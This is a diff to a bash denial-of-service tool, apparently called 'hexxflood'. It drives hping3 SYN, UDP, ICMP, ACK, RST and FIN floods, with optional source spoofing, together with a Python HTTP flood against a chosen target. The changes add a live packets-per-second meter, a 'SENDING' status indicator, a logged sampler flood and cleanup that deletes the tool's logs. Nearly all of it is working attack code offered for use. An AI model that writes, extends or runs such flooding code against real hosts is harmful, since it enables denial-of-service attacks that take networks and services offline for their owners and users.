@@ -465,7 +465,19 @@ monitor_attack() {
     fi
     echo -e "${YELLOW}🧵 Threads:${NC} $THREADS   ${YELLOW}📦 Packet:${NC} ${PACKET_SIZE}B   ${YELLOW}🕒 Duration:${NC} ${dur_disp}"
     echo -e "${RED}Press Ctrl+C to stop — the full run scrolls below${NC}"
+
+    # Surface the real hping3 banner (proof the flood engine actually launched
+    # against the target with the requested packet size / mode).
+    if [ -s "${HPING_LOG:-/nonexistent}" ]; then
+        echo -e "${PURPLE}hping3 »${NC} $(head -1 "$HPING_LOG")"
+    fi
     echo -e "${CYAN}────────────────────────────────────────────────────────────────${NC}"
+
+    # Track the previous tick so we can show a LIVE (instantaneous) packet rate
+    # instead of only a lifetime average — a live pps that climbs is the clearest
+    # signal that the attack is actually sending.
+    local prev_packets=$initial_packets
+    local prev_time=$start_time
 
     while true; do
         if [ $duration -gt 0 ]; then
@@ -476,11 +488,21 @@ monitor_attack() {
             fi
         fi
 
+        local now=$(date +%s)
         local current_packets=$(get_packet_count)
-        local elapsed=$(( $(date +%s) - start_time ))
+        local elapsed=$(( now - start_time ))
         local packets_sent=$((current_packets - initial_packets))
-        local pps=0
-        [ $elapsed -gt 0 ] && pps=$((packets_sent / elapsed))
+
+        # Instantaneous rate = packets since the last tick / seconds since it.
+        local dt=$(( now - prev_time )); [ $dt -le 0 ] && dt=1
+        local dpkts=$(( current_packets - prev_packets ))
+        [ $dpkts -lt 0 ] && dpkts=0
+        local pps=$(( dpkts / dt ))                    # live pps (this tick)
+        local avg=0
+        [ $elapsed -gt 0 ] && avg=$(( packets_sent / elapsed ))   # lifetime avg
+        prev_packets=$current_packets
+        prev_time=$now
+
         local bw=0
         [ $pps -gt 0 ] && bw=$(( (pps * PACKET_SIZE * 8) / 1000000 ))
 
@@ -490,13 +512,21 @@ monitor_attack() {
         local hcount=$(pgrep -c hping3 2>/dev/null || echo 0)
         local httpc=$(pgrep -cf http_flood.py 2>/dev/null || echo 0)
         local cpu=$(top -bn1 | grep -m1 Cpu | awk '{print $2}')
-        local mem=$(free -h | awk '/Mem/{print $3"/"$2}')
+
+        # Clear "is it working?" indicator: green when packets are climbing and
+        # flood processes are alive, red idle otherwise.
+        local status
+        if { [ "$hcount" -gt 0 ] || [ "$httpc" -gt 0 ]; } && [ $dpkts -gt 0 ]; then
+            status="${GREEN}⚡ SENDING${NC}"
+        else
+            status="${RED}·· idle  ${NC}"
+        fi
 
         local rem=""
         [ $duration -gt 0 ] && rem="  ${YELLOW}rem${NC} $((duration - elapsed))s"
 
         # One streaming line per tick -> the whole run scrolls by
-        echo -e "${CYAN}[$(date +%H:%M:%S)]${NC} ${YELLOW}t${NC} ${elapsed}s${rem}  ${YELLOW}pkts${NC} $(printf "%'d" $packets_sent)  ${YELLOW}pps${NC} $(printf "%'d" $pps)  ${YELLOW}bw${NC} ${bw}Mbps  ${YELLOW}resp${NC} ${resp}  ${YELLOW}cpu${NC} ${cpu:-0}%  ${YELLOW}mem${NC} ${mem}  ${YELLOW}proc${NC} h:${hcount} w:${httpc}"
+        echo -e "${CYAN}[$(date +%H:%M:%S)]${NC} ${status}  ${YELLOW}t${NC} ${elapsed}s${rem}  ${YELLOW}pkts${NC} $(printf "%'d" $packets_sent)  ${YELLOW}pps${NC} $(printf "%'d" $pps)  ${YELLOW}avg${NC} $(printf "%'d" $avg)  ${YELLOW}bw${NC} ${bw}Mbps  ${YELLOW}resp${NC} ${resp}  ${YELLOW}cpu${NC} ${cpu:-0}%  ${YELLOW}proc${NC} h:${hcount} w:${httpc}"
 
         sleep 2
     done
@@ -519,9 +549,20 @@ cleanup() {
     # Detach background flood jobs so bash won't print async "Killed" notices
     disown -a 2>/dev/null || true
 
+    # Gently SIGINT the logged sampler first so hping3 flushes its real
+    # "N packets transmitted" summary to the log before we hard-kill the rest.
+    if [ -n "${HPING_SAMPLER_PID:-}" ]; then
+        sudo kill -INT "$HPING_SAMPLER_PID" 2>/dev/null
+        sleep 0.3
+    fi
+    local hping_summary=""
+    if [ -f "${HPING_LOG:-/nonexistent}" ]; then
+        hping_summary=$(grep -a "packets transmitted" "$HPING_LOG" | tail -1)
+    fi
+
     # Stop everything quietly (hide job-control + kill output)
     { sudo pkill -9 hping3; sudo pkill -9 -f http_flood.py; } >/dev/null 2>&1
-    rm -f /tmp/http_flood.py 2>/dev/null
+    rm -f /tmp/http_flood.py "${HPING_LOG:-/tmp/hexxflood_hping.log}" 2>/dev/null
     wait 2>/dev/null
 
     # Final stats (if the attack actually started)
@@ -562,6 +603,7 @@ cleanup() {
         pl "      Total Packets Sent : ${GREEN}$(printf "%'d" "$total")${NC}"
         pl "      Total Attack Time  : ${GREEN}${elapsed}s${NC}"
         pl "      Average PPS        : ${GREEN}$(printf "%'d" "$avg")${NC}"
+        [ -n "$hping_summary" ] && pl "      hping3 (sampler)   : ${GREEN}${hping_summary}${NC}"
         pl ""
     fi
     pl "${CYAN}${light}${NC}"
@@ -668,6 +710,27 @@ main() {
                 esac
             done
         done
+
+        # One extra "sampler" flood whose real hping3 output is captured to a log
+        # (the bulk floods above stay silent for speed). It mirrors the first
+        # selected attack type so the banner reflects the actual attack, and its
+        # "packets transmitted" summary is shown on stop. stdin=/dev/null + output
+        # to a file means it never touches the TTY, so no setsid is needed and we
+        # keep its PID to SIGINT it cleanly for the summary.
+        HPING_LOG="/tmp/hexxflood_hping.log"
+        : > "$HPING_LOG" 2>/dev/null
+        local first_type sport uport
+        first_type=$(echo "$ATTACK_TYPES" | cut -d',' -f1)
+        sport="${TCP_PORTS%% *}"; uport="${UDP_PORTS%% *}"
+        case "$first_type" in
+            udp)  sudo hping3 -2 --flood $SPOOF_FLAG -p ${PP}$uport -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
+            icmp) sudo hping3 -1 --flood $SPOOF_FLAG            -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
+            ack)  sudo hping3 -A --flood $SPOOF_FLAG -p ${PP}$sport -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
+            rst)  sudo hping3 -R --flood $SPOOF_FLAG -p ${PP}$sport -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
+            fin)  sudo hping3 -F --flood $SPOOF_FLAG -p ${PP}$sport -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
+            *)    sudo hping3 -S --flood $SPOOF_FLAG -p ${PP}$sport -d $PACKET_SIZE -i $DELAY $TARGET </dev/null >"$HPING_LOG" 2>&1 & ;;
+        esac
+        HPING_SAMPLER_PID=$!
     fi
 
     # Detach the background flood jobs from job control so bash doesn't print
